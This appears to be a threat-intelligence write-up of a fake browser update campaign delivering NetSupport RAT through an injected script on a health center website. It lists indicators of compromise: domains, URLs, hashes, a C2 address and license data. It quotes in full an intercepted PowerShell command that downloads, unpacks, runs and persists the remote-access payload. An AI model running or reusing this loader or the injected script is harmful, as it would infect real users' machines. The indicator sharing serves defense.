THREAT IDENTIFICATION:  FAKE BROWSER UPDATE / NETSUPPORT RAT (SMARTAPE/HANEYMANEY)

INFECTED DOMAIN
jeffersoncountyhealthcenter.org

INJECTED URL
https://www.jeffersoncountyhealthcenter.org/

STAGE 1 INJECTED JAVASCRIPT
<script type='text/javascript' src="https://andreeasasser.com/cdn-vs/minlen.php"></script>

STAGE 2 USER-AGENT AND COOKIE CHECK URLS
https://andreeasasser.com/cdn-vs/minlen.php

FAKE UPDATE PAGE HTML
https://andreeasasser.com/cache/qzwewmrqqgqnaww.php?reqtime=1699646630607
(The .zip file is embedded as a base64 blob in this page along with a script)

ZIP FILE DOWNLOAD URL
https://andreeasasser.com/d02bfa59-693a-46c6-9e50-c50248080067

ZIP FILE HASH
Update  -  1020231110.zip
8628bd6edf62fdc8240579c3ae59973f

JS FILE HASH
Update_browser_17.6436.js
a8a7a00de2c874c14a8af38e9d1ee9ba

ADDITIONAL JS FILES IN THE ZIP FILE
11a8a55227952fda65ea23ad4ee64c73
1ac292c94838221cf7c6f691563c5f97
7c7e87ce12027ebfe24b6807bac036eb

1 file had the same file hash as the .js file above
The files I saw were all named:
"Update_browser_17.64[0-9]{4}5327\.js"

INTERCEPTED POWERSHELL
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Ex Bypass -NoP -C $AznUqzLgTlzqkvAEvOQnxHVMiYuv='https://addisonlynch.com/111.php?5368';$wVGbLiOKQvPTHyMuzhpS=(New-Object System.Net.WebClient).DownloadString($AznUqzLgTlzqkvAEvOQnxHVMiYuv);$zMkpEcqVKnsRz=[System.Convert]::FromBase64String($wVGbLiOKQvPTHyMuzhpS);$zxc = Get-Random -Minimum -10000 -Maximum 10000; $KubuAvqLPhIrjAuHvTZ=[System.Environment]::GetFolderPath('ApplicationData')+'\DIVX'+$zxc;if (!(Test-Path $KubuAvqLPhIrjAuHvTZ -PathType Container)) { New-Item -Path $KubuAvqLPhIrjAuHvTZ -ItemType Directory };$p=Join-Path $KubuAvqLPhIrjAuHvTZ 'pop.zip';[System.IO.File]::WriteAllBytes($p,$zMkpEcqVKnsRz);try {    Add-Type -A System.IO.Compression.FileSystem;    [System.IO.Compression.ZipFile]::ExtractToDirectory($p,$KubuAvqLPhIrjAuHvTZ)} catch {    Write-Host 'Failed: ' + $_;    exit};$e=Join-Path $KubuAvqLPhIrjAuHvTZ 'client32.exe';if (Test-Path $e -PathType Leaf) {    Start-Process -FilePath $e} else {    Write-Host 'No exe.'};$FSDFSSD=Get-Item $KubuAvqLPhIrjAuHvTZ -Force; $FSDFSSD.attributes='Hidden';$s=$KubuAvqLPhIrjAuHvTZ+'\client32.exe';$k='HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run';$v='DIVXX';$t='String';New-ItemProperty -Path $k -Name $v -Value $s -PropertyType $t;

PAYLOAD DOWNLOAD URL
https://addisonlynch.com/111.php?5368

PAYLOAD FILE HASH
client32.exe
c4f1b50e3111d29774f7525039ff7086

NETSUPPORT RAT C2
http://5.181.156.60/fakeurl.htm

RADIUS SECRET
RADIUSSecret=dgAAAPpMkI7ke494fKEQRUoablcA

NETSUPPORT RAT LICENSE INFORMATION
1200
0xa353ff01

; NetSupport License File.
; Generated on 14:45 - 17/07/2022

[[Enforce]]

[_License]
control_only=0
expiry=
inactive=0
licensee=HANEYMANEY
maxslaves=8888
os2=1
product=10
serial_no=NSM385736
shrink_wrap=0
transport=0





